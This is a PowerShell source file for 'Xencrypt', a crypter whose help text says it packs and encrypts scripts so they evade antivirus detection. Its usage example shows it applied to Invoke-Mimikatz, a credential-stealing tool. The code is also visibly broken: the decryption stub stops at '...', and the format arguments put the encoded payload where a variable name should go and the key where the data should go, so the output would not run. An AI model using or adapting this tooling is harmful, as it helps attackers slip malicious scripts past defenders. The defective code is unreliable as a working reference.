# Xencrypt - PowerShell Crypter
# Copyright (C) 2020 Xentropy ( @SamuelAnttila )
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
$PSDefaultParameterValues['*:ErrorAction'] = 'Stop'

function Create-Var {
    # Generates a random variable name of varying lengths to increase obfuscation.
    $charset = "abcdefghijkmnopqrstuvwxyz"
    (1..(4 + (Get-Random -Maximum 6)) | ForEach-Object { $charset[(Get-Random -Minimum 0 -Maximum $charset.Length)] }) -join ''
}

function Invoke-Xencrypt {
    <#
    .SYNOPSIS
    Obfuscates and encrypts a PowerShell script to evade antivirus detection.

    .DESCRIPTION
    Invoke-Xencrypt takes any PowerShell script as input and performs packing and encryption to make it harder for antivirus (AV) tools to detect. 
    You can recursively layer this obfuscation multiple times to bypass dynamic and heuristic detection methods.

    .PARAMETER InFile
    Specifies the input PowerShell script to obfuscate and encrypt.

    .PARAMETER OutFile
    Specifies the file where the obfuscated and encrypted script will be saved.

    .PARAMETER Iterations
    Defines how many layers of packing and encryption will be applied. The default is 2 iterations.

    .EXAMPLE
    PS> Invoke-Xencrypt -InFile Invoke-Mimikatz.ps1 -OutFile obfuscated.ps1 -Iterations 3

    .LINK
    https://github.com/the-xentropy/xencrypt
    #>

    [CmdletBinding()]
    param (
        [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [string]$InFile = $(Throw "-InFile is required"),
        
        [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [string]$OutFile = $(Throw "-OutFile is required"),
        
        [Parameter(Mandatory = $false, ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [int]$Iterations = 2
    )

    process {
        Write-Output @"
Xencrypt - PowerShell Crypter
Copyright (C) 2020 Xentropy ( @SamuelAnttila )
This software is distributed under the GNU General Public License.
"@

        # Read the input script
        Write-Output "[*] Reading '$InFile' ..."
        if (-not (Test-Path $InFile)) {
            Throw "Error: Input file '$InFile' not found."
        }
        $codeBytes = [System.IO.File]::ReadAllBytes($InFile)

        for ($i = 1; $i -le $Iterations; $i++) {
            Write-Output "[*] Starting encryption layer $i..."

            # Randomly select encryption parameters
            $paddingModes = 'PKCS7', 'ISO10126', 'ANSIX923', 'Zeros'
            $paddingMode = $paddingModes | Get-Random

            $cipherModes = 'ECB', 'CBC'
            $cipherMode = $cipherModes | Get-Random

            $keySizes = 128, 192, 256
            $keySize = $keySizes | Get-Random

            $compressionTypes = 'Gzip', 'Deflate'
            $compressionType = $compressionTypes | Get-Random

            # Compress the script
            Write-Output "[*] Compressing the script using $compressionType..."
            $outputStream = New-Object System.IO.MemoryStream
            if ($compressionType -eq "Gzip") {
                $compressionStream = New-Object System.IO.Compression.GzipStream($outputStream, [IO.Compression.CompressionMode]::Compress)
            } elseif ($compressionType -eq "Deflate") {
                $compressionStream = New-Object System.IO.Compression.DeflateStream($outputStream, [IO.Compression.CompressionMode]::Compress)
            }
            $compressionStream.Write($codeBytes, 0, $codeBytes.Length)
            $compressionStream.Close()
            $compressedBytes = $outputStream.ToArray()

            # Generate encryption key
            Write-Output "[*] Generating encryption key and IV..."
            $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
            $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::$cipherMode
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::$paddingMode
            $aesManaged.KeySize = $keySize
            $aesManaged.GenerateKey()
            $aesManaged.GenerateIV()

            $encryptionKey = [System.Convert]::ToBase64String($aesManaged.Key)

            # Encrypt the compressed script
            Write-Output "[*] Encrypting the script..."
            $encryptor = $aesManaged.CreateEncryptor()
            $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length)
            $finalData = $aesManaged.IV + $encryptedData
            $aesManaged.Dispose()

            $encodedScript = [System.Convert]::ToBase64String($finalData)

            # Randomize script construction
            Write-Output "[*] Obfuscating and finalizing code layer..."
            $stubTemplate = @'
# Obfuscated and encrypted layer
${0} = [System.Convert]::FromBase64String("{1}")
${2} = [System.Convert]::FromBase64String("{3}")
...
'@
            $script = $stubTemplate -f $encodedScript, $encryptionKey, (Create-Var), (Create-Var)
            $codeBytes = [System.Text.Encoding]::UTF8.GetBytes($script)
        }

        # Write the final obfuscated script to the output file
        Write-Output "[*] Writing the obfuscated script to '$OutFile'..."
        [System.IO.File]::WriteAllText($OutFile, [System.Text.Encoding]::UTF8.GetString($codeBytes))
        Write-Output "[+] Obfuscation and encryption completed!"
    }
}
